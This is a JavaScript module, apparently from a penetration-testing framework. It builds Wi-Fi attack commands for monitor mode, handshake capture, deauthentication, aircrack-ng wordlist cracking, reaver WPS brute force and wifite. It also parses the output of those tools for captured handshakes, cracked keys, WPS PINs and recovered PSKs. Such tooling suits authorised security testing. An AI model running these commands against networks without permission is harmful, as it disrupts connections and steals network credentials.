// Wireless attack command builders + output parsers (Phase 8).
// Execution requires a Wi-Fi adapter in monitor mode on a Linux host / Kali container with
// USB passthrough. On a Windows host these commands won't find an interface — that's expected.

// Build a command for a high-level wireless action.
//   action: scan | monitor | capture | deauth | crack | wps
export function buildWirelessCommand({ action, iface = 'wlan0', mon = 'wlan0mon', bssid, channel, wordlist = '/usr/share/wordlists/rockyou.txt', cap = 'capture-01.cap' } = {}) {
  switch (action) {
    case 'monitor':
      return `airmon-ng start ${iface}`;
    case 'scan':
      return `timeout 30 airodump-ng ${mon}`;
    case 'capture':
      return `airodump-ng --bssid ${bssid} -c ${channel} -w capture ${mon}`;
    case 'deauth':
      return `aireplay-ng --deauth 5 -a ${bssid} ${mon}`;
    case 'crack':
      return `aircrack-ng -w ${wordlist} -b ${bssid} ${cap}`;
    case 'wps':
      return `reaver -i ${mon} -b ${bssid} -vv`;
    case 'auto':
      return `wifite --kill`;
    default:
      return `iw dev`;
  }
}

// Parse airodump-ng network list -> findings.
export function parseAirodump(text, source = 'airodump-ng') {
  const findings = [];
  for (const raw of String(text).split('\n')) {
    // BSSID  PWR Beacons #Data ... CH MB ENC CIPHER AUTH ESSID
    const m = /^([0-9A-F]{2}(?::[0-9A-F]{2}){5})\s+.*\s(WEP|WPA|WPA2|WPA3|OPN)\s.*\s+(\S.*)$/i.exec(raw.trim());
    if (m) {
      const enc = m[2].toUpperCase();
      findings.push({
        finding_type: 'wireless',
        severity: enc === 'WEP' || enc === 'OPN' ? 'high' : 'info',
        title: `Wi-Fi: ${m[3].trim()} [${enc}]`,
        host: m[1],
        evidence: raw.trim().slice(0, 200),
        source,
      });
    }
  }
  return findings;
}

// Detect handshake capture / WPS pin / cracked key.
export function parseWirelessResult(text, source = 'aircrack-ng') {
  const out = [];
  const t = String(text);
  if (/WPA handshake:\s*([0-9A-F:]{17})/i.test(t)) {
    const b = /WPA handshake:\s*([0-9A-F:]{17})/i.exec(t)[1];
    out.push({ finding_type: 'wireless', severity: 'medium', title: `WPA handshake captured (${b})`, host: b, source: 'airodump-ng' });
  }
  const key = /KEY FOUND!\s*\[\s*(.+?)\s*\]/i.exec(t);
  if (key) out.push({ finding_type: 'wireless', severity: 'critical', title: `Wi-Fi key cracked: ${key[1]}`, evidence: key[1], source });
  const pin = /WPS PIN:\s*'?(\d{8})'?/i.exec(t);
  if (pin) out.push({ finding_type: 'wireless', severity: 'critical', title: `WPS PIN found: ${pin[1]}`, evidence: pin[1], source: 'reaver' });
  const psk = /\[\+\]\s*PSK:\s*'(.+?)'/i.exec(t);
  if (psk) out.push({ finding_type: 'wireless', severity: 'critical', title: `WPA PSK recovered: ${psk[1]}`, evidence: psk[1], source: 'reaver' });
  return out;
}

export function extractWirelessFindings(command, output) {
  if (!/airodump|aircrack|reaver|wifite|aireplay/i.test(command) || !output) return [];
  const list = parseAirodump(output);
  const res = parseWirelessResult(output);
  return [...list, ...res];
}
